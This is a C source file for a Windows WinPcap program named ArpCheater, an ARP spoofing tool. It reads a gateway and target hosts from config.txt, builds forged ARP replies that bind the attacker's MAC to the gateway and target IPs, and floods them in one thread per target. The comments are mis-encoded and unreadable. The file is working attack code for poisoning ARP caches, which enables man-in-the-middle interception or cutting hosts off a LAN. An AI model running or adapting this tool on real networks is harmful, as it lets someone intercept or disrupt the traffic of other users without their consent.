#include "ArpCheater.h"

/*
	VS�е�����:
	ʹ�ó���:�����еĶ���ע�͸�Ϊ����ע��
		1.ʹ�÷��齫ע���е����ݲ�������,������ʹ��()����..
			/\*(.*)\* /
		2.�����������,\��$(VS��),��ԭע��������ӵ��µĵ���ע����,
			//$1
*/

pcap_t *deviceHandler;
pcap_addr_t *pAddress; //������ַ 
//���ͽ���ǿתΪ�ַ����ͼ���,(unsigned char*)&gatewayToHostPacket
ArpDatagram gatewayToHostPacket; //���ص�����ARP��
ArpDatagram hostToGatewayPacket; //����������ARP��
unsigned long localIp; //����IP��ַ 
unsigned long netmask; //��������
unsigned char *localMac; //����MAC��ַ 
int hostNumber;//��Ҫ��������������
int attackCount;//��Ҫ�����Ĵ���
unsigned long gatewayIP; //����IP
unsigned char gatewayMac[6]; //����MAC
unsigned long *fakeIps; //Ҫαװ�ɵ�IP��ַ�б�
//��Ҫ����������MAC��ַ�б�,������δ֪,��ʱ������ָ���ʾ
unsigned char (*attackHostMacs)[6];

int main() {
	loadConfig();
	showConfig();
	
	pcap_if_t *allDevices; //��������
	pcap_if_t *device; //ĳ����
	int deviceCount = 0; //��������
	int deviceNumber = 0; //ѡ���ָ�����������

	char errorBuffer[PCAP_ERRBUF_SIZE]; //������Ϣ����

	//��ȡ���������б�
	int findResult = pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &allDevices, errorBuffer);
	if (-1 == findResult)
	{
		free(allDevices);
		allDevices = NULL;
		fprintf(stderr, "%s\n", errorBuffer);
		exit(1);
	}

	for (device = allDevices; NULL != device; device = device->next) {
		printf("%d: %s", ++deviceCount, device->name);
		if (NULL == device->description) {
			printf("(No device available!)\n");
		}
		else
		{
			printf("(%s)\n", device->description);
		}
	}
	//ѡ��һ���������й���
	printf("Enter the interface number(1 - %d):", deviceCount);
	scanf("%d", &deviceNumber);
	//����û�ѡ���������ų�����Ч��Χ�����˳� 
	if (deviceNumber > deviceCount || deviceNumber < 1) {
		printf("Interface number out of range!");
		//�ͷ��豸�б�
		pcap_freealldevs(allDevices);
		return -1;
	}
	//����ָ������
	for (device = allDevices, deviceCount = 0; deviceCount < deviceNumber - 1; deviceCount++, device = device->next);

	//��ȡ����MAC
	localMac = getLocalMac(device->name);
	//Debug
	localMac[0] = 0x011;

	//������
	deviceHandler = pcap_open(device->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errorBuffer);

	if (NULL == deviceHandler)
	{
		fprintf(stderr, "\nUnable to open the adapter, %s is not supported by WinPcap.\n", device->name);
		pcap_freealldevs(allDevices);
		return -1;
	}

	//��ȡָ���豸��ip����������,���ж��������Ƿ���ͬһ����
	int isSameNetworkSegment = FALSE;
	for (pAddress = device->addresses; NULL != pAddress; pAddress = pAddress->next) {
		localIp = ((struct sockaddr_in*)pAddress->addr)->sin_addr.s_addr;
		netmask = ((struct sockaddr_in *)pAddress->netmask)->sin_addr.s_addr;
		if (0 == localIp || 0 == netmask) {
			continue;
		}


		//�жϱ���ip�Ƿ��ָ��������ͬһ����
		if ((localIp & netmask) != (gatewayIP & netmask)) {
			//�������һ������������������ַ�б�
			continue;
		}
		isSameNetworkSegment = TRUE;
		//���ݶ�ȡ������Ŀ�������������ݰ�����arp��������
		for (int i = 0; i < hostNumber; i++)
		{
			//�жϱ���ip�Ƿ��ָ������IP��ͬһ����,�������һ��������������
			if ((localIp & netmask) == (fakeIps[i] & netmask)) {
				//sendAttackPacket(fakeIps[i], *(attackHostMacs + i));
				//TODO
				//���������һ�����̼߳���,���߳�ͬʱֻ�ܶ�ĳ̨�������ж�������
				AttackHost *host = calloc(1, sizeof(AttackHost));
				host->ip = fakeIps[i];
				host->mac = *(attackHostMacs + i);
				_beginthread(sendAttackPacket, 0, (void *)host);
			}
		}
		
		/*
			//��ȡ����������
			unsigned long hostSize = ntohl(~netmask);
			//��ȡ������ַ
			unsigned long net = localIp & netmask;
		*/
	}

	if (FALSE == isSameNetworkSegment)
	{
		printf("������Ϣ����,������ָ�����ز���ͬһ����,����!\n");
	}

	system("pause");
	free(fakeIps);
	free(attackHostMacs);
	return 0;
}

/*
	ָ��IP�������ݰ�,�����������Ĳ���:
		1.ģ��·�ɷ���arpӦ���������(Դ��ַ:·��IP+����MAC,Ŀ���ַ:����������IP+����������MAC)
		2.ģ����������arpӦ�����·��(Դ��ַ:����������IP+����MAC,Ŀ���ַ:·��IP+·��MAC)
*/
//void sendAttackPacket(unsigned long hostIP,unsigned char *hostMac) {
void sendAttackPacket(void *p) {
	AttackHost *host = (AttackHost *)p;
	unsigned long hostIP = host->ip;
	unsigned char *hostMac = host->mac;
	unsigned long IPs[2] = { gatewayIP, hostIP };
	unsigned char *Macs[2] = { gatewayMac , hostMac};
	for (int i = 0, j = 1; i < 2; i++, j--)
	{
		//����ٵ�arpӦ���,�ﵽ����αװ�ɸ�����IPs��ַ��Ŀ��
		if (i == 0)
		{
			buildArpReplyDatagram(&gatewayToHostPacket, localMac, IPs[i], IPs[j], Macs[j]);
		}
		else {
			buildArpReplyDatagram(&hostToGatewayPacket ,localMac, IPs[i], IPs[j], Macs[j]);
		}
	}

	//�������ݰ�
	for (int k = 0; k < attackCount; k++)
	{
		int sendResult = pcap_sendpacket(deviceHandler, (unsigned char*)&gatewayToHostPacket, 60);
		showResult(sendResult, IPs, Macs, 0, 1);
		sendResult = pcap_sendpacket(deviceHandler, (unsigned char*)&hostToGatewayPacket, 60);
		showResult(sendResult, IPs, Macs, 1, 0);
		Sleep(10);
	}
	free(p);
	_endthread();
}
/*
	��ʾ���
*/
void showResult(int sendResult, unsigned long *IPs, unsigned char **Macs, int i, int j) {
	if (sendResult == -1)
	{
		fprintf(stderr, "pcap_sendpacket error.\n");
	}
	else {
		unsigned char *senderIP = (unsigned char*)&IPs[i];
		unsigned char *receiverIP = (unsigned char*)&IPs[j];
		if (i == 0) {
			printf("·��->����:\n");
			printf("source IPs:%d.%d.%d.%d -- source mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				senderIP[0], senderIP[1], senderIP[2], senderIP[3],
				localMac[0], localMac[1], localMac[2], localMac[3], localMac[4], localMac[5]
			);
			printf("destination IPs:%d.%d.%d.%d -- destination mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
				Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
			);
		}
		else {
			printf("����->·��:\n");
			printf("source IPs:%d.%d.%d.%d -- source mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				senderIP[0], senderIP[1], senderIP[2], senderIP[3],
				localMac[0], localMac[1], localMac[2], localMac[3], localMac[4], localMac[5]
			);
			printf("destination IPs:%d.%d.%d.%d -- destination mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
				Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
			);
		}
	}
}
/*
	��ȡ����MAC
	@param deviceName ָ�����й����������豸����
*/
unsigned char* getLocalMac(char* deviceName) {
	//+8��ȥ��"rpcap://"
	deviceName = deviceName + 8;
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER adapter = PacketOpenAdapter(deviceName);
	if (NULL == adapter || (adapter->hFile) == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	PPACKET_OID_DATA oidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (NULL == oidData)
	{
		PacketCloseAdapter(adapter);
		return NULL;
	}
	//Retrieve the adapter MAC querying the NIC driver 
	oidData->Oid = OID_802_3_CURRENT_ADDRESS;
	oidData->Length = 6;
	memset(oidData->Data, 0, 6);
	int status = PacketRequest(adapter, FALSE, oidData);
	if (TRUE == status)
	{
		memcpy(mac, (u_char *)(oidData->Data), 6);
	}

	free(oidData);
	oidData = NULL;
	PacketCloseAdapter(adapter);
	return mac;
}

/*
	��װARPЭ��Ӧ���
	@param packet ��Ҫ�����Ӧ���
	@param sourceMac ԴMAC
	@param sourceIP ԴIP
	@param destinationIP Ŀ��IP
*/
void buildArpReplyDatagram(ArpDatagram *packet, unsigned char* sourceMac, unsigned long sourceIP,
	unsigned long destinationIP, unsigned char* destinationMac) {

	//ARP�����Ŀ��MAC��ַ�ǹ㲥��ַ:FF-FF-FF-FF-FF-FF
	//memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	memcpy(packet->ethnetFrame.destinationMac, destinationMac, 6);
	//ԴMAC��ַ
	memcpy(packet->ethnetFrame.sourceMAC, sourceMac, 6);
	//֡���� ARP:0X806
	packet->ethnetFrame.frameType = htons(0x0806);

	//Ӳ������ Ethernet��0x0001 
	packet->arpDatagram.hardwareType = htons(0x01);

	//Ҫӳ���Э���ַ���� IP 0x8000
	packet->arpDatagram.protocolType = htons(0x0800);
	//Ӳ����ַ���� MAC��ַΪ6
	packet->arpDatagram.hardwareAddressLength = 0x06;
	//Э���ַ���� IP��ַΪ4
	packet->arpDatagram.protocolAddressLength = 0x04;
	//�������� ARP����Ϊ1,Ӧ��Ϊ2
	packet->arpDatagram.operationType = htons(0x02);
	//ԴMAC��ַ
	memcpy(packet->arpDatagram.senderMac, sourceMac, 6);
	//ԴIP��ַ
	packet->arpDatagram.senderIP = sourceIP;
	//Ŀ��MAC��ַ
	memcpy(packet->arpDatagram.receiverMac, destinationMac, 6);
	//Ŀ��IP��ַ
	packet->arpDatagram.receiverIP = destinationIP;
	//������� 18Bytes
	memset(packet->arpDatagram.padding, 0, sizeof(packet->arpDatagram.padding));
}

/*
	��ʼ������
*/
void init() {
	fakeIps = (unsigned long *)calloc(hostNumber, sizeof(unsigned long));
	attackHostMacs = (unsigned char (*)[6])calloc(hostNumber, sizeof(char) * 6);
}

/*
	���������ļ�����ʼ��������
	���� : ��õ�ǰ����Ŀ¼.
	char* _getcwd(char *buffer, int maxlen);
*/
void loadConfig() {
	char buffer[300] = { 0 };
	printf("��ǰ·��:%s\n", _getcwd(buffer, 300));

	FILE *config = fopen("./config.txt", "r");
	if (config == NULL)
	{
		fprintf(stderr, "��ǰ·���в�����config.txt�����ļ�,����!\n");
		fclose(config);
		config = NULL;
		exit(-1);
	}
	//ָ�������ݵ����Ǵ�ŵ�IP����MAC,1��ʾIP,2��ʾMAC
	int contentIndicator = 0;
	//��ǰ��ȡ���������
	int hostId = 0;
	int i = 0;
	while (!feof(config))
	{
		fgets(buffer, 300, config);

		if (buffer[0] == '#')
		{
			continue;
		}
		else if (TRUE == isSpaceLine(buffer)) {
			//�ڿ���ʱ,������ΪIP
			contentIndicator = INDICATOR_IP;
			continue;
		}
		else if (strstr(buffer, HOST_NUMBER) != NULL)
		{
			sscanf(buffer, "hostNumber=%d", &hostNumber);
			//��ȡ�����������Ϳ��Կ�ʼ��ʼ����
			init();
		}
		else if (strstr(buffer, ATTACK_COUNT) != NULL)
		{
			//��ȡ��������
			sscanf(buffer, "attackCount=%d", &attackCount);
		}
		else
		{
			//��ȡ���ص�IP��MAC,����ռ��һ��,��1�ȶ�
			if (hostNumber + 1 > hostId) {
				if (hostId == 0)
				{
					hostId = loadIPOrMac(buffer, contentIndicator, &gatewayIP, gatewayMac, hostId);
				}
				else {
					hostId = loadIPOrMac(buffer, contentIndicator, &fakeIps[hostId - 1], attackHostMacs[hostId - 1], hostId);
				}
			}
			contentIndicator++;
		}
	}

	fclose(config);
	config = NULL;
}

/*
��ȡIP��MAC
*/
int loadIPOrMac(char *buffer, int contentIndicator, unsigned long *ip, unsigned char *mac, int hostId) {
	if (contentIndicator == INDICATOR_IP)
	{
		(*ip) = inet_addr(buffer);
	}
	else if (contentIndicator == INDICATOR_MAC) {
		sscanf(buffer, "%hhX-%hhX-%hhX-%hhX-%hhX-%hhX",
			&mac[0], &mac[1], &mac[2],
			&mac[3], &mac[4], &mac[5]);
		//��ȡ��MAC֮��������������ݲ����ȡ���
		hostId++;
	}
	return hostId;
}

/*
�жϵ�ǰ���Ƿ�Ϊ����,fgets��ȡ���л᷵��'\n',�����жϷ�������:
1.�����'\n'��ʼ,���ǿ���
2.�������'\n'֮ǰ�������ַ���Ϊ' '�ո�,Ҳ�ǿ���
*/
int isSpaceLine(char *buffer) {
	if (buffer == NULL)
	{
		return TRUE;
	}
	if (buffer[0] == '\n') {
		return TRUE;
	}
	for (int i = 0; buffer[i] != '\n'; i++)
	{
		if (buffer[i] != ' ')
		{
			return FALSE;
		}
	}
	return TRUE;
}

/*
��ʾ��ȡ�������غ�������IP��MAC
*/
void showConfig() {
	printf("����IP��MAC:\n");
	unsigned char *ip = (unsigned char*)&gatewayIP;
	printf("%d.%d.%d.%d\n", ip[0], ip[1], ip[2], ip[3]);
	printf("%02X-%02X-%02X-%02X-%02X-%02X\n",
		gatewayMac[0], gatewayMac[1], gatewayMac[2],
		gatewayMac[3], gatewayMac[4], gatewayMac[5]);
	for (int i = 0; i < hostNumber; i++)
	{
		printf("����IP��MAC:\n");
		unsigned char *ip = (unsigned char*)&fakeIps[i];
		printf("%d.%d.%d.%d\n", ip[0], ip[1], ip[2], ip[3]);
		printf("%02X-%02X-%02X-%02X-%02X-%02X\n",
			attackHostMacs[i][0], attackHostMacs[i][1], attackHostMacs[i][2],
			attackHostMacs[i][3], attackHostMacs[i][4], attackHostMacs[i][5]);
	}
	printf("\n");
}